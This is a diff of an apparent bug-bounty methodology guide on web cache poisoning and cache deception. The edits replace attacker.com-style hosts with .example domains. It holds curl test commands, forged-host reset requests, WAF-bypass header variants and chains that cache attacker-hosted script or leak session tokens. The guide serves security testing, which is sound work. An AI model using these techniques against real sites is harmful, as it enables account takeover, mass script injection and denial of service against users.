@@ -31,11 +31,11 @@ The app uses the `Host` header to construct the password reset link in the email
 
 ```
 POST /forgot-password
-Host: attacker.com
-X-Forwarded-Host: attacker.com
-X-Host: attacker.com
+Host: attacker.example
+X-Forwarded-Host: attacker.example
+X-Host: attacker.example
 
-email=victim@target.com
+email=victim@target.example
 Content-Type: application/x-www-form-urlencoded
 ```
 
@@ -98,7 +98,7 @@ X-HTTP-Method-Override
 
 2. **Identify cache key components.** Send two identical requests — if `Age` increments, the response is cached. Vary headers one-by-one (e.g., add `X-Forwarded-Host`) to determine which headers are NOT included in the cache key (unkeyed).
 
-3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.com` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=<random>`) so the probe lands on a cache MISS under a throwaway key — this verifies reflection without prematurely storing a live poison entry under the real, victim-shared cache key. (Param Miner's "Guess headers" mode is the canonical Burp tool for discovering these unkeyed headers/parameters automatically.)
+3. **Test unkeyed header reflection.** Add `X-Forwarded-Host: evil.example` and check if the value appears in the response body (redirects, canonical links, CSP headers, JS src attributes, meta tags). Append a unique cache-busting query parameter (e.g. `?cb=<random>`) so the probe lands on a cache MISS under a throwaway key — this verifies reflection without prematurely storing a live poison entry under the real, victim-shared cache key. (Param Miner's "Guess headers" mode is the canonical Burp tool for discovering these unkeyed headers/parameters automatically.)
 
 4. **Test URL path manipulation (Web Cache Deception).** Append fake static extensions to dynamic endpoints:
    - `GET /account/profile.css`
@@ -130,24 +130,24 @@ X-HTTP-Method-Override
 **Confirm caching behavior:**
 ```bash
 # Send twice, compare Age header
-curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
-curl -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
+curl -s -I "https://target.example/page" | grep -i "age\|x-cache\|cf-cache"
+curl -s -I "https://target.example/page" | grep -i "age\|x-cache\|cf-cache"
 ```
 
 **Test unkeyed X-Forwarded-Host:**
 ```bash
-curl -s -H "X-Forwarded-Host: evil.attacker.com" \
-  "https://target.com/page" | grep -i "evil.attacker.com"
+curl -s -H "X-Forwarded-Host: evil.attacker.example" \
+  "https://target.example/page" | grep -i "evil.attacker.example"
 ```
 
 **Test Web Cache Deception (path appending):**
 ```bash
 # Authenticated session cookie required
 curl -s -b "session=YOUR_SESSION" \
-  "https://target.com/account/profile.css"
+  "https://target.example/account/profile.css"
 
 # Then fetch without auth from another client
-curl -s "https://target.com/account/profile.css"
+curl -s "https://target.example/account/profile.css"
 ```
 
 **Force cache miss to test poison without hitting cached version:**
@@ -155,16 +155,16 @@ curl -s "https://target.com/account/profile.css"
 # Use a unique cache-busting query param to land on a fresh key — do NOT rely on
 # client-sent "Cache-Control: no-cache" (per RFC 7234 it requests revalidation, not
 # skip-storage, and Cloudflare/Fastly/Akamai generally ignore it on cacheable assets).
-curl -s -H "X-Forwarded-Host: canary.attacker.com" \
-     "https://target.com/page?cb=$RANDOM"
+curl -s -H "X-Forwarded-Host: canary.attacker.example" \
+     "https://target.example/page?cb=$RANDOM"
 ```
 
 **DoS via poisoned error response:**
 ```bash
 curl -s -H "X-Forwarded-Host: aaaaaaaaaaa.invalid" \
-  "https://target.com/js/app.js" -I
+  "https://target.example/js/app.js" -I
 # Check if next clean request returns error
-curl -s -I "https://target.com/js/app.js" | grep "HTTP/"
+curl -s -I "https://target.example/js/app.js" | grep "HTTP/"
 ```
 
 **Grep patterns in Burp/ZAP response history:**
@@ -185,9 +185,9 @@ Cache-Control: public.*max-age  (on authenticated endpoint)
 
 **Parameter pollution test:**
 ```bash
-curl -s "https://target.com/page?cb=1&param=CANARY_VALUE" | grep CANARY_VALUE
+curl -s "https://target.example/page?cb=1&param=CANARY_VALUE" | grep CANARY_VALUE
 # Then check if clean request returns poisoned version
-curl -s "https://target.com/page?cb=1"
+curl -s "https://target.example/page?cb=1"
 ```
 
 **Burp Suite Intruder wordlist for unkeyed headers:**
@@ -230,7 +230,7 @@ Add `Origin` to the unkeyed-header set. Test whether it is reflected into `Acces
 ## Bypass Techniques
 
 **Defense: WAF blocking known poison headers**
-- Bypass: Use less-common header variants: `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=evil.com`, `X-Original-URL`
+- Bypass: Use less-common header variants: `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded: host=evil.example`, `X-Original-URL`
 - Bypass: Header value encoding: `X-Forwarded-Host: evil%2ecom`
 - Bypass: Case variation: `x-forwarded-host`, `X-FORWARDED-HOST`
 
@@ -287,7 +287,7 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 1. **Shopify — Cache poisoning via X-Forwarded-Host** ([H1 #977851](https://hackerone.com/reports/977851))
     - Subclass: X-Forwarded-Host header poisoning (unkeyed input → redirect/script-src corruption)
-    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.com` — single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
+    - Payload: `GET /any-path` with `X-Forwarded-Host: attacker.example` — single request persisted attacker host in cached response across `apps.shopify.com` and localized subdomains
     - Root cause: X-Forwarded-Host influenced asset/redirect URL generation but was NOT part of the cache key
     - Year: 2020 — **$1,300 → escalated to $6,300** (one-shot poison, multi-host blast radius)
 
@@ -331,8 +331,8 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 ## Related Skills & Chains
 
-- **`hunt-xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.com` poisons cached script src → cached response now contains `<script src="//attacker.com/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
-- **`hunt-http-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.com` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
+- **`hunt-xss`** — Cache poisoning is the multiplier that turns reflected XSS (low-severity self-inflicted) into stored XSS across every CDN-edge visitor. Chain primitive: `X-Forwarded-Host: attacker.example` poisons cached script src → cached response now contains `<script src="//attacker.example/x.js">` → every visitor to that CDN edge executes attacker JS, persistent for the full Cache-Control max-age.
+- **`hunt-http-smuggling`** — Smuggling bypasses front-end cache-key normalization and WAF stripping of poison headers, hitting the cache server directly. Chain primitive: CL.TE smuggle delivers `X-Forwarded-Host: attacker.example` to the cache backend past the WAF that stripped it at the edge → poisoned entry stored under the victim's normal URL → de-sync poisoning where the smuggled request becomes the cached response for the next victim.
 - **`hunt-auth-bypass`** — Web Cache Deception turns authenticated pages into publicly-cached responses, leaking session-bound content to unauthenticated attackers. Chain primitive: `/account/profile.css` served as authenticated HTML, cached as static asset → attacker fetches same URL without auth and reads victim's email/tokens → session cookies in body → full ATO.
 - **`security-arsenal`** — Reach for the unkeyed-header wordlist (`X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `Forwarded`, `X-Original-URL`) and the WCD path-extension list (`.css`, `.js`, `.jpg`, `.ico`, `;.css`, `%2e%2ecss`) before hand-fuzzing.
 - **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical: the poisoned response MUST be reproducible from a separate IP/incognito without your poison headers. If only your own browser sees the effect, it's a self-cache and N/A.
